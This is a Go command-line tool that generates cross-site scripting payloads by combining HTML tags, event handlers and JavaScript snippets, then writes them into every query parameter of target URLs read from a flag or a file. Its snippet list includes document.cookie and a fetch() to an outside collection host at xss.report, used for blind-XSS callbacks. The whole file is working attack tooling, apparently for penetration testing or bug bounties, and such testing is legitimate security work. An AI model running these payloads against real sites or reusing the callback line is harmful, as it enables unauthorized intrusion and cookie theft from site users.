package main

import (
        "bufio"
        "flag"
        "fmt"
        "math/rand"
        "net/url"
        "os"
        "sort"
        "strings"
        "time"
)

// HTML tags, JavaScript events, and code snippets for generating XSS payloads
var htmlTags = []string{"div", "img", "script", "iframe", "svg", "input", "a", "body", "p", "span"}
var jsEvents = []string{"onload", "onerror", "onclick", "onmouseover", "onfocus", "onblur", "onmouseout", "ondblclick"}
var jsCodeSnippets = []string{"confirm(1)", "confirm(\"XSS\")", "prompt(1)", "prompt(\"XSS\")", "alert(1)", "alert(\"XSS\")", "console.log(\"XSS\")", "document.cookie", "document.write(\"XSS\")", "fetch(\"https://xss.report/c/vulnhound\")"}
var cssProperties = []string{"color", "background-color", "width", "height", "border"}

// Random string generator for random attribute values
func randomString(n int) string {
        const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        result := make([]byte, n)
        for i := range result {
                result[i] = letters[rand.Intn(len(letters))]
        }
        return string(result)
}

// XSS payload generator
func generateRandomXssPayloads(numberOfPayloads int) []string {
        payloads := make([]string, numberOfPayloads)
        for i := 0; i < numberOfPayloads; i++ {
                tag := htmlTags[rand.Intn(len(htmlTags))]
                event := jsEvents[rand.Intn(len(jsEvents))]
                code := jsCodeSnippets[rand.Intn(len(jsCodeSnippets))]
                randomAttrValue := randomString(10)
                cssProperty := cssProperties[rand.Intn(len(cssProperties))]
                cssValue := fmt.Sprintf("%dpx", rand.Intn(100)+1)

                var attribute string
                if rand.Intn(2) == 0 {
                        attribute = fmt.Sprintf(`style="%s:%s;"`, cssProperty, cssValue)
                } else {
                        attribute = fmt.Sprintf(`%c="%s"`, 'a'+rand.Intn(26), randomAttrValue)
                }

                payloads[i] = fmt.Sprintf(`<%s %s="%s" %s>`, tag, event, code, attribute)
        }
        return payloads
}

// Injects a single XSS payload into a URL's parameters
func injectPayloadIntoUrl(rawUrl, payload string) (string, error) {
        parsedUrl, err := url.Parse(rawUrl)
        if err != nil {
                return "", err
        }

        queryParams := parsedUrl.Query()
        for param := range queryParams {
                queryParams.Set(param, payload)
        }

        parsedUrl.RawQuery = queryParams.Encode()
        return parsedUrl.String(), nil
}

// Reads patterns from a file
func readPatternsFromFile(filePath string) ([]string, error) {
        file, err := os.Open(filePath)
        if err != nil {
                return nil, err
        }
        defer file.Close()

        var patterns []string
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
                line := strings.TrimSpace(scanner.Text())
                if line != "" {
                        patterns = append(patterns, line)
                }
        }

        if err := scanner.Err(); err != nil {
                return nil, err
        }

        return patterns, nil
}

// Randomly selects a subset of patterns from the provided list
func randomizePatterns(patterns []string, count int) []string {
        if count > len(patterns) {
                count = len(patterns)
        }

        selected := make([]string, 0, count)
        perm := rand.Perm(len(patterns))
        for _, i := range perm[:count] {
                selected = append(selected, patterns[i])
        }

        return selected
}

// Remove duplicates from a slice of strings
func uniqueStrings(slice []string) []string {
        seen := make(map[string]struct{})
        result := []string{}

        for _, str := range slice {
                if _, exists := seen[str]; !exists {
                        seen[str] = struct{}{}
                        result = append(result, str)
                }
        }
        return result
}

func main() {
        // Parse command-line arguments
        filePath := flag.String("file", "", "Path to a .txt file containing URLs")
        singleUrl := flag.String("url", "", "Single URL to inject payloads into")
        patternsFile := flag.String("patterns", "", "Path to a .txt file containing XSS patterns")
        numberOfPayloads := flag.Int("number", 1, "Number of XSS payloads to generate")
        randomization := flag.Int("randomization", 0, "Number of patterns to randomly select from the patterns file")
        verbose := flag.Bool("verbose", false, "Display verbose output")
        flag.Parse()

        // Seed the random number generator
        rand.Seed(time.Now().UnixNano())

        // Generate the XSS payloads
        payloads := generateRandomXssPayloads(*numberOfPayloads)

        // Read XSS patterns from file
        var patterns []string
        if *patternsFile != "" {
                var err error
                patterns, err = readPatternsFromFile(*patternsFile)
                if err != nil {
                        fmt.Printf("Error reading patterns file: %v\n", err)
                        return
                }
        }

        // Randomize patterns if requested
        if *randomization > 0 && len(patterns) > 0 {
                patterns = randomizePatterns(patterns, *randomization)
        }

        // Combine generated payloads with patterns
        allPayloads := append(payloads, patterns...)

        // Set to store unique URLs
        urlsSet := make(map[string]struct{})

        if *singleUrl != "" {
                // Inject payloads into a single URL
                if *verbose {
                        fmt.Printf("Original URL: %s\n", *singleUrl)
                }
                for _, payload := range allPayloads {
                        injectedUrl, err := injectPayloadIntoUrl(*singleUrl, payload)
                        if err != nil {
                                fmt.Printf("Error injecting payload into URL: %v\n", err)
                                continue
                        }
                        urlsSet[injectedUrl] = struct{}{}
                }
        } else if *filePath != "" {
                // Read URLs from file
                file, err := os.Open(*filePath)
                if err != nil {
                        fmt.Printf("Error opening file: %v\n", err)
                        return
                }
                defer file.Close()

                scanner := bufio.NewScanner(file)
                for scanner.Scan() {
                        url := scanner.Text()

                        if *verbose {
                                fmt.Printf("Original URL: %s\n", url)
                        }

                        for _, payload := range allPayloads {
                                injectedUrl, err := injectPayloadIntoUrl(url, payload)
                                if err != nil {
                                        fmt.Printf("Error injecting payload into URL: %v\n", err)
                                        continue
                                }

                                urlsSet[injectedUrl] = struct{}{}
                        }
                }

                if err := scanner.Err(); err != nil {
                        fmt.Printf("Error reading file: %v\n", err)
                }
        } else {
                // Print the payloads if no file or URL is provided
                if *verbose {
                        for idx, payload := range allPayloads {
                                fmt.Printf("Payload %d: %s\n", idx+1, payload)
                        }
                } else {
                        for _, payload := range allPayloads {
                                fmt.Println(payload)
                        }
                }
        }

        // Output the unique URLs
        uniqueUrls := make([]string, 0, len(urlsSet))
        for url := range urlsSet {
                uniqueUrls = append(uniqueUrls, url)
        }
        sort.Strings(uniqueUrls)
        for _, url := range uniqueUrls {
                fmt.Println(url)
        }
}
